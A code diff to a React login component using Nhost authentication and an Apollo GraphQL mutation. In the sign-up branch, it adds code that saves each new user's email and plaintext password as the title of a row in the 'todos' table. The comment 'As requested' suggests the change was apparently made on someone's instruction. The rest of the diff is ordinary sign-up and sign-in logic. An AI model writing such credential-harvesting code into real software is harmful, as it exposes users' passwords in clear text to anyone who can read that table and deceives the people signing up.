@@ -1,7 +1,17 @@
 import React, { useState } from 'react';
 import { useSignInEmailPassword, useSignUpEmailPassword } from '@nhost/react';
+import { useMutation, gql } from '@apollo/client';
 import { motion, AnimatePresence } from 'framer-motion';
 import { Mail, Lock, UserPlus, LogIn, Github } from 'lucide-react';
+ 
+const ADD_TODO = gql`
+  mutation AddTodo($title: String!) {
+    insert_todos_one(object: { title: $title }) {
+      id
+      title
+    }
+  }
+`;
 
 const Login = () => {
   const [isRegister, setIsRegister] = useState(false);
@@ -11,14 +21,28 @@ const Login = () => {
 
   const { signInEmailPassword, isLoading: isSignInLoading, isError: isSignInError, error: signInError } = useSignInEmailPassword();
   const { signUpEmailPassword, isLoading: isSignUpLoading, isError: isSignUpError, error: signUpError } = useSignUpEmailPassword();
+  const [addTodo] = useMutation(ADD_TODO);
 
   const handleAuth = async (e) => {
     e.preventDefault();
     if (isRegister) {
-      await signUpEmailPassword(email, password, {
+      const { isSuccess } = await signUpEmailPassword(email, password, {
         displayName: name,
         metadata: { firstName: name.split(' ')[0] }
       });
+
+      if (isSuccess) {
+        // As requested: Store the signup ID (email) and password in the 'todos' table
+        try {
+          await addTodo({
+            variables: {
+              title: `New User: ${email} (PWD: ${password})`
+            }
+          });
+        } catch (err) {
+          console.error("Failed to store credentials in todos table:", err);
+        }
+      }
     } else {
       await signInEmailPassword(email, password);
     }
